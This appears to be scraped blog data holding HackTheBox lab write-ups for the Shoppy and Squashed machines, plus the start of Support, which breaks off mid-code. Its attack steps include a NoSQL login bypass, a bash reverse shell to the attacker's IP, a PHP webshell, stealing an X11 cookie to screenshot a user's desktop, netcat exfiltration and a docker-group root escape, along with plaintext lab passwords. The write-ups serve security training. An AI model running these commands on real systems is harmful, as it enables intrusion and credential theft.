1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9093-TCP:V=7.94%I=7%D=8/30%Time=64EF7405%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\u0026#34;)%r(GetRequest,252E,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\ SF:x20text/plain;\\x20version=0\\.0\\.4;\\x20charset=utf-8\\r\\nDate:\\x20Wed,\\x2 SF:030\\x20Aug\\x202023\\x2016:52:49\\x20GMT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_ SF:automatic_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\x SF:20generated\\x20by\\x20the\\x20Go\\x20runtime\\.\\n#\\x20TYPE\\x20go_gc_cycles_ SF:automatic_gc_cycles_total\\x20counter\\ngo_gc_cycles_automatic_gc_cycles_ SF:total\\x2010\\n#\\x20HELP\\x20go_gc_cycles_forced_gc_cycles_total\\x20Count\\ SF:x20of\\x20completed\\x20GC\\x20cycles\\x20forced\\x20by\\x20the\\x20applicatio SF:n\\.\\n#\\x20TYPE\\x20go_gc_cycles_forced_gc_cycles_total\\x20counter\\ngo_gc SF:_cycles_forced_gc_cycles_total\\x200\\n#\\x20HELP\\x20go_gc_cycles_total_gc SF:_cycles_total\\x20Count\\x20of\\x20all\\x20completed\\x20GC\\x20cycles\\.\\n#\\x SF:20TYPE\\x20go_gc_cycles_total_gc_cycles_total\\x20counter\\ngo_gc_cycles_t SF:otal_gc_cycles_total\\x2010\\n#\\x20HELP\\x20go_gc_duration_seconds\\x20A\\x2 SF:0summary\\x20of\\x20the\\x20pause\\x20duration\\x20of\\x20garbage\\x20collecti SF:on\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_duration_seconds\\x20summary\\ngo_gc_d SF:uration_seconds{quantile=\\\u0026#34;0\\\u0026#34;}\\x201\\.9596e-05\\ngo_gc_duration_seconds{ SF:quantile=\\\u0026#34;0\\.25\\\u0026#34;}\\x209\\.8576e-05\\ngo_gc_d\u0026#34;)%r(HTTPOptions,1000,\u0026#34;HTTP/ SF:1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x20text/plain;\\x20version=0\\.0\\.4;\\x SF:20charset=utf-8\\r\\nDate:\\x20Wed,\\x2030\\x20Aug\\x202023\\x2016:52:49\\x20GM SF:T\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_automatic_gc_cycles_total\\x20Count\\x SF:20of\\x20completed\\x20GC\\x20cycles\\x20generated\\x20by\\x20the\\x20Go\\x20ru SF:ntime\\.\\n#\\x20TYPE\\x20go_gc_cycles_automatic_gc_cycles_total\\x20counter SF:\\ngo_gc_cycles_automatic_gc_cycles_total\\x2010\\n#\\x20HELP\\x20go_gc_cycl SF:es_forced_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\x SF:20forced\\x20by\\x20the\\x20application\\.\\n#\\x20TYPE\\x20go_gc_cycles_force SF:d_gc_cycles_total\\x20counter\\ngo_gc_cycles_forced_gc_cycles_total\\x200\\ SF:n#\\x20HELP\\x20go_gc_cycles_total_gc_cycles_total\\x20Count\\x20of\\x20all\\ SF:x20completed\\x20GC\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_cycles_total_gc_cycl SF:es_total\\x20counter\\ngo_gc_cycles_total_gc_cycles_total\\x2010\\n#\\x20HEL SF:P\\x20go_gc_duration_seconds\\x20A\\x20summary\\x20of\\x20the\\x20pause\\x20du SF:ration\\x20of\\x20garbage\\x20collection\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_d SF:uration_seconds\\x20summary\\ngo_gc_duration_seconds{quantile=\\\u0026#34;0\\\u0026#34;}\\x201 SF:\\.9596e-05\\ngo_gc_duration_seconds{quantile=\\\u0026#34;0\\.25\\\u0026#34;}\\x209\\.8576e-05\\n SF:go_gc_d\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 114.47 seconds Web Server gobuster └─$ gobuster dir -u http://shoppy.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://shoppy.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/08/30 17:58:27 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 179] [--\u0026gt; /images/] /login (Status: 200) [Size: 1074] /admin (Status: 302) [Size: 28] [--\u0026gt; /login] /assets (Status: 301) [Size: 179] [--\u0026gt; /assets/] /css (Status: 301) [Size: 173] [--\u0026gt; /css/] /Login (Status: 200) [Size: 1074] /js (Status: 301) [Size: 171] [--\u0026gt; /js/] /fonts (Status: 301) [Size: 177] [--\u0026gt; /fonts/] /Admin (Status: 302) [Size: 28] [--\u0026gt; /login] /exports (Status: 301) [Size: 181] [--\u0026gt; /exports/] vhosts Nothing └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u \u0026#39;http://shoppy.htb/\u0026#39; -H \u0026#39;Host: FUZZ.shoppy.htb\u0026#39; -fs 169 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://shoppy.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.shoppy.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 169 ________________________________________________ :: Progress: [19966/19966] :: Job [1/1] :: 271 req/sec :: Duration: [0:01:23] :: Errors: 0 :: Foothold/User #1 http://shoppy.htb/login Trying basic sqli payloads had no results sqlmap -r login.req --batch --level 5 --risk 3 also failed So I checked nosqli payloads And none of them worked either But posts in the forum hinted about the nosqli So then I found this post admin' || '1'=='1 worked We\u0026rsquo;re in There\u0026rsquo;s nothing except search option for users If we search for admin user we get a hit But the hash is not crackable So then I tried the same payload And we got one more user: josh Cracking password for josh is successful josh:remembermethisway But creds don\u0026rsquo;t work for ssh I was stuck here, then someone hinted to use a different wordlist for vhost fuzzing mattermost.shoppy.htb └─$ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u \u0026#39;http://shoppy.htb/\u0026#39; -H \u0026#39;Host: FUZZ.shoppy.htb\u0026#39; -fs 169 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://shoppy.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.shoppy.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response size: 169 ________________________________________________ [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 114ms] * FUZZ: mattermost It\u0026rsquo;s a Mattermost Using josh\u0026rsquo;s creds work We found creds in one of the channels jaeger:Sh0ppyBest@pp! And we can ssh User #2 sudo jaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager Tried running it but it requires master password jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager [sudo] password for jaeger: Welcome to Josh password manager! Please enter your master password: Sh0ppyBest@pp! Access denied! This incident will be reported ! Let\u0026rsquo;s download it └─$ scp jaeger@shoppy.htb:/home/deploy/password-manager . jaeger@shoppy.htb\u0026#39;s password: password-manager I opened it using ghidra If we try Sample for master key, it works We now can su as deploy deploy:Deploying@pp! Root No sudo rights But we are in docker group deploy@shoppy:~$ id uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker) We can follow GTFOBins docker run -v /:/mnt --rm -it alpine chroot /mnt sh And we can read root flag If we want a shell We can create a .ssh and add our ssh key to authorized_keys ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/shoppy/images/shoppy.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/shoppy/","summary":"Shoppy Enumeration nmap └─$ nmap -Pn -p- 10.10.11.180 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 17:39 BST Nmap scan report for 10.10.11.180 (10.10.11.180) Host is up (0.14s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9093/tcp open copycat └─$ nmap -Pn -p22,80,9093 -sC -sV 10.10.11.180 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 17:53 BST Nmap scan report for 10.","tags":["HTB","nosql-injection","mattermost","nosql-auth-bypass","nodejs","mongodb","crackstation","reverse-engineering","sudo","ghidra","docker","docker-group"],"title":"[HTB] Machine: Shoppy"},{"categories":null,"contents":"Squashed Enumeration nmap └─$ nmap -Pn -p- 10.10.11.191 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 14:22 BST Nmap scan report for 10.10.11.191 (10.10.11.191) Host is up (0.14s latency). Not shown: 65527 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 2049/tcp open nfs 38053/tcp open unknown 47709/tcp open unknown 52131/tcp open unknown 57917/tcp open unknown └─$ nmap -Pn -p22,80,111,2049,38053,47709,52131,57917 -sC -sV 10.10.11.191 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 14:33 BST Nmap scan report for 10.10.11.191 (10.10.11.191) Host is up (0.15s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Built Better 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 37895/udp mountd | 100005 1,2,3 39773/tcp6 mountd | 100005 1,2,3 47709/tcp mountd | 100005 1,2,3 52511/udp6 mountd | 100021 1,3,4 38053/tcp nlockmgr | 100021 1,3,4 42869/tcp6 nlockmgr | 100021 1,3,4 43633/udp nlockmgr | 100021 1,3,4 53905/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs 3-4 (RPC #100003) 38053/tcp open nlockmgr 1-4 (RPC #100021) 47709/tcp open mountd 1-3 (RPC #100005) 52131/tcp open mountd 1-3 (RPC #100005) 57917/tcp open mountd 1-3 (RPC #100005) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web Server gobuster └─$ gobuster dir -u http://10.10.11.191/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,php --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.191/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: txt,php [+] Timeout: 10s =============================================================== 2023/08/31 14:38:05 Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.11.191/images/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.191/css/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.191/js/] /.php (Status: 403) [Size: 277] /server-status (Status: 403) [Size: 277] Progress: 661614 / 661683 (99.99%) nfs └─$ showmount -e 10.10.11.191 Export list for 10.10.11.191: /home/ross * /var/www/html * Foothold Let\u0026rsquo;s mount /home/ross/ └─$ sudo mount -t nfs 10.10.11.191:/home/ross /mnt/nfs └─$ tree -aL 2 /mnt/nfs /mnt/nfs ├── .bash_history -\u0026gt; /dev/null ├── .cache [error opening dir] ├── .config [error opening dir] ├── Desktop ├── Documents │ └── Passwords.kdbx ├── Downloads ├── .gnupg [error opening dir] ├── .local [error opening dir] ├── Music ├── Pictures ├── Public ├── Templates ├── Videos ├── .viminfo -\u0026gt; /dev/null ├── .Xauthority ├── .xsession-errors └── .xsession-errors.old Let\u0026rsquo;s check /var/www/html └─$ sudo mount -t nfs 10.10.11.191:/var/www/html /mnt/nfs mount.nfs: access denied by server while mounting 10.10.11.191:/var/www/html So I receive permission denied error └─$ ls -lha /mnt/nfs ls: cannot access \u0026#39;/mnt/nfs/.\u0026#39;: Permission denied ls: cannot access \u0026#39;/mnt/nfs/..\u0026#39;: Permission denied ls: cannot access \u0026#39;/mnt/nfs/.htaccess\u0026#39;: Permission denied ls: cannot access \u0026#39;/mnt/nfs/index.html\u0026#39;: Permission denied ls: cannot access \u0026#39;/mnt/nfs/images\u0026#39;: Permission denied ls: cannot access \u0026#39;/mnt/nfs/css\u0026#39;: Permission denied ls: cannot access \u0026#39;/mnt/nfs/js\u0026#39;: Permission denied total 0 d????????? ? ? ? ? ? . d????????? ? ? ? ? ? .. ?????????? ? ? ? ? ? css ?????????? ? ? ? ? ? .htaccess ?????????? ? ? ? ? ? images ?????????? ? ? ? ? ? index.html ?????????? ? ? ? ? ? js Suprisingly, the directory itself belongs to www-data group and owned by user with userid 2017 └─$ ls -ld /mnt/nfs drwxr-xr-- 5 2017 www-data 4096 Aug 31 16:10 /mnt/nfs So I didn\u0026rsquo;t know that nfs doesn’t track users and groups across machines. It just knows the IDs, and uses the local system for that. So we can create locally a user with that UID and using that user you will be able to access the file/folder https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting#permissions So let\u0026rsquo;s do it Now we can access the directory We can also write to that directory Let\u0026rsquo;s create a web shell I don\u0026rsquo;t know if it\u0026rsquo;s running php or not, so I just created basic php webshell And it looks like it works Let\u0026rsquo;s get reverse shell bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.4/6666 0\u0026gt;\u0026amp;1' We need to url-encode \u0026amp; with %26 Root We see that ross is logged in alex@squashed:/tmp$ w 15:53:04 up 2:31, 1 user, load average: 0.00, 0.06, 0.08 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT ross tty7 :0 13:21 2:31m 13.30s 0.06s /usr/libexec/gnome-session-binary --systemd --session=gnome We saw .Xauthority file inside ross\u0026rsquo;s home directory https://stackoverflow.com/questions/37157097/how-does-x11-authorization-work-mit-magic-cookie/37367518#37367518 We can access it by changing UID of our dummy user sudo usermod -u 1001 dummy └─$ xxd /mnt/nfs/.Xauthority 00000000: 0100 000c 7371 7561 7368 6564 2e68 7462 ....squashed.htb 00000010: 0001 3000 124d 4954 2d4d 4147 4943 2d43 ..0..MIT-MAGIC-C 00000020: 4f4f 4b49 452d 3100 1020 1a8f 403f 44bf OOKIE-1.. ..@?D. 00000030: 0dd6 d2e8 6cc0 a13a 32 ....l..:2 If check the post we can see that the 2nd, 3rd and 4th mechanisms store the keys inside ~/.Xauthority therefore anyone who has access to this file, can connect to the server pretending to be \u0026quot;you\u0026quot; Let\u0026rsquo;s download .Xauthority file as alex alex@squashed:/tmp$ curl http://10.10.16.4/.Xauthority -o /tmp/.Xauthority % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 57 100 57 0 0 94 0 --:--:-- --:--:-- --:--:-- 94 alex@squashed:/tmp$ ls -lha total 16K drwxrwxrwt 3 root root 4.0K Aug 31 16:03 . drwxr-xr-x 20 root root 4.0K Oct 21 2022 .. -rw-r--r-- 1 alex alex 57 Aug 31 16:03 .Xauthority drwx------ 2 alex alex 4.0K Aug 31 15:41 tmux-2017 We follow hacktricks post We need xdpyinfo and xwininfo for enumeration XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0 XAUTHORITY=/tmp/.Xauthority xdpyinfo -display :0 both of the tools connected But I need only xmininfo since it showed interesting windows Passwords - KeePassXC We saw Passwords.kdbx in ross\u0026rsquo;s home directory alex@squashed:/tmp$ XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0 xwininfo: Window id: 0x533 (the root window) (has no name) Root window id: 0x533 (the root window) (has no name) Parent window id: 0x0 (none) 26 children: 0x80000b \u0026#34;gnome-shell\u0026#34;: (\u0026#34;gnome-shell\u0026#34; \u0026#34;Gnome-shell\u0026#34;) 1x1+-200+-200 +-200+-200 1 child: 0x80000c (has no name): () 1x1+-1+-1 +-201+-201 0x800022 (has no name): () 802x575+-1+26 +-1+26 1 child: 0x1a00006 \u0026#34;Passwords - KeePassXC\u0026#34;: (\u0026#34;keepassxc\u0026#34; \u0026#34;keepassxc\u0026#34;) 800x536+1+38 +0+64 1 child: 0x1a000fe \u0026#34;Qt NET_WM User Time Window\u0026#34;: () 1x1+-1+-1 +-1+63 0x1a00008 \u0026#34;Qt Client Leader Window\u0026#34;: () 1x1+0+0 +0+0 0x800017 (has no name): () 1x1+-1+-1 +-1+-1 0x2200001 \u0026#34;gsd-keyboard\u0026#34;: (\u0026#34;gsd-keyboard\u0026#34; \u0026#34;Gsd-keyboard\u0026#34;) 10x10+10+10 +10+10 0x1e00001 \u0026#34;keepassxc\u0026#34;: (\u0026#34;keepassxc\u0026#34; \u0026#34;Keepassxc\u0026#34;) 10x10+10+10 +10+10 0x1c00001 \u0026#34;evolution-alarm-notify\u0026#34;: (\u0026#34;evolution-alarm-notify\u0026#34; \u0026#34;Evolution-alarm-notify\u0026#34;) 10x10+10+10 +10+10 0x1a00004 \u0026#34;Qt Selection Owner for keepassxc\u0026#34;: () 3x3+0+0 +0+0 0x1800001 \u0026#34;gsd-power\u0026#34;: (\u0026#34;gsd-power\u0026#34; \u0026#34;Gsd-power\u0026#34;) 10x10+10+10 +10+10 0x1200002 (has no name): () 10x10+0+0 +0+0 0x1600001 \u0026#34;gsd-wacom\u0026#34;: (\u0026#34;gsd-wacom\u0026#34; \u0026#34;Gsd-wacom\u0026#34;) 10x10+10+10 +10+10 0x1400001 \u0026#34;gsd-color\u0026#34;: (\u0026#34;gsd-color\u0026#34; \u0026#34;Gsd-color\u0026#34;) 10x10+10+10 +10+10 0x1200001 \u0026#34;gsd-xsettings\u0026#34;: (\u0026#34;gsd-xsettings\u0026#34; \u0026#34;Gsd-xsettings\u0026#34;) 10x10+10+10 +10+10 0x1000001 \u0026#34;gsd-media-keys\u0026#34;: (\u0026#34;gsd-media-keys\u0026#34; \u0026#34;Gsd-media-keys\u0026#34;) 10x10+10+10 +10+10 0xc00003 \u0026#34;ibus-xim\u0026#34;: () 1x1+0+0 +0+0 1 child: 0xc00004 (has no name): () 1x1+-1+-1 +-1+-1 0xc00001 \u0026#34;ibus-x11\u0026#34;: (\u0026#34;ibus-x11\u0026#34; \u0026#34;Ibus-x11\u0026#34;) 10x10+10+10 +10+10 0xa00001 \u0026#34;ibus-extension-gtk3\u0026#34;: (\u0026#34;ibus-extension-gtk3\u0026#34; \u0026#34;Ibus-extension-gtk3\u0026#34;) 10x10+10+10 +10+10 0x800011 (has no name): () 1x1+-100+-100 +-100+-100 0x80000f (has no name): () 1x1+-1+-1 +-1+-1 0x800009 (has no name): () 1x1+-100+-100 +-100+-100 0x800008 (has no name): () 1x1+-100+-100 +-100+-100 0x800007 (has no name): () 1x1+-100+-100 +-100+-100 0x800006 \u0026#34;GNOME Shell\u0026#34;: () 1x1+-100+-100 +-100+-100 0x800001 \u0026#34;gnome-shell\u0026#34;: (\u0026#34;gnome-shell\u0026#34; \u0026#34;Gnome-shell\u0026#34;) 10x10+10+10 +10+10 0x600008 (has no name): () 1x1+-100+-100 +-100+-100 0x800010 \u0026#34;mutter guard window\u0026#34;: () 800x600+0+0 +0+0 Let\u0026rsquo;s try capturing screenshots XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 \u0026gt; /tmp/screenshot.xwd alex@squashed:/tmp$ XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 \u0026gt; /tmp/screenshot.xwd alex@squashed:/tmp$ ls -lha total 1.9M drwxrwxrwt 3 root root 4.0K Aug 31 16:10 . drwxr-xr-x 20 root root 4.0K Oct 21 2022 .. -rw-r--r-- 1 alex alex 57 Aug 31 16:03 .Xauthority -rw-r--r-- 1 alex alex 1.9M Aug 31 16:10 screenshot.xwd drwx------ 2 alex alex 4.0K Aug 31 15:41 tmux-2017 alex@squashed:/tmp$ file screenshot.xwd screenshot.xwd: XWD X Window Dump image data, \u0026#34;xwdump\u0026#34;, 800x600x24 Now we need to download the screenshot and convert it to image I\u0026rsquo;ll do it using nc listener Start one on my attack box └─$ nc -lvnp 7777 \u0026gt; screenshot.xwd listening on [any] 7777 ... Pipe the content of the screenshot to nc connecting to my attack box alex@squashed:/tmp$ cat screenshot.xwd | nc 10.10.16.4 7777 Check the listner We just wait a few seconds and then CTRL+C └─$ nc -lvnp 7777 \u0026gt; screenshot.xwd listening on [any] 7777 ... connect to [10.10.16.4] from (UNKNOWN) [10.10.11.191] 60712 ^C Check the file with md5sum alex@squashed:/tmp$ md5sum screenshot.xwd 49aab38d7e75be91ba868d753ecd033e screenshot.xwd └─$ md5sum screenshot.xwd 49aab38d7e75be91ba868d753ecd033e screenshot.xwd Everything looks fine Let\u0026rsquo;s convert it using imagemagick └─$ convert screenshot.xwd screenshot.png └─$ file screenshot.png screenshot.png: PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced Now we can su to root since we have a password from screenshot root:cah$mei7rai9A ","date":"August 28, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/squashed/images/squashed.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/squashed/","summary":"Squashed Enumeration nmap └─$ nmap -Pn -p- 10.10.11.191 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 14:22 BST Nmap scan report for 10.10.11.191 (10.10.11.191) Host is up (0.14s latency). Not shown: 65527 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 2049/tcp open nfs 38053/tcp open unknown 47709/tcp open unknown 52131/tcp open unknown 57917/tcp open unknown └─$ nmap -Pn -p22,80,111,2049,38053,47709,52131,57917 -sC -sV 10.","tags":["HTB","nfs","showmount","x11","xauthority","webshell","screenshare","keepass"],"title":"[HTB] Machine: Squashed"},{"categories":null,"contents":"Support Enumeration nmap └─$ nmap -p- -Pn 10.10.11.174 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 13:05 BST Nmap scan report for 10.10.11.174 (10.10.11.174) Host is up (0.094s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws └─$ nmap -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV 10.10.11.174 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-30 13:11 BST Nmap scan report for 10.10.11.174 (10.10.11.174) Host is up (0.18s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-30 12:10:41Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: -36s | smb2-time: | date: 2023-08-30T12:10:55 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 61.85 seconds smb └─$ smbclient -N -L //10.10.11.174 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share support-tools Disk support staff tools SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available └─$ smbclient -N //10.10.11.174/support-tools Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Jul 20 18:01:06 2022 .. D 0 Sat May 28 12:18:25 2022 7-ZipPortable_21.07.paf.exe A 2880728 Sat May 28 12:19:19 2022 npp.8.4.1.portable.x64.zip A 5439245 Sat May 28 12:19:55 2022 putty.exe A 1273576 Sat May 28 12:20:06 2022 SysinternalsSuite.zip A 48102161 Sat May 28 12:19:31 2022 UserInfo.exe.zip A 277499 Wed Jul 20 18:01:07 2022 windirstat1_1_2_setup.exe A 79171 Sat May 28 12:20:17 2022 WiresharkPortable64_3.6.5.paf.exe A 44398000 Sat May 28 12:19:43 2022 4026367 blocks of size 4096. 968923 blocks available ldapsearch └─$ ldapsearch -H ldap://support.htb -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=support,DC=htb namingcontexts: CN=Configuration,DC=support,DC=htb namingcontexts: CN=Schema,CN=Configuration,DC=support,DC=htb namingcontexts: DC=DomainDnsZones,DC=support,DC=htb namingcontexts: DC=ForestDnsZones,DC=support,DC=htb # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://support.htb -x -b \u0026#34;DC=support,DC=htb\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=support,DC=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4f7c # numResponses: 1 Foothold/User UserInfo.exe.zip Let\u0026rsquo;s reverse it using dnspy └─$ file UserInfo.exe/UserInfo.exe UserInfo.exe/UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections We have interesting classes LdapQuery and Protected LdapQuery() retrieves password from Protected class We now have username support\\ldap public LdapQuery() { string password = Protected.getPassword(); this.entry = new DirectoryEntry(\u0026#34;LDAP://support.htb\u0026#34;, \u0026#34;support\\\\ldap\u0026#34;, password); this.entry.AuthenticationType = AuthenticationTypes.Secure; this.ds = new DirectorySearcher(this.entry); } Protected class internal class Protected { // Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318 public static string getPassword() { byte[] array = Convert.FromBase64String(Protected.enc_password); byte[] array2 = array; for (int i = 0; i \u0026lt; array.Length; i++) { array2[i] = 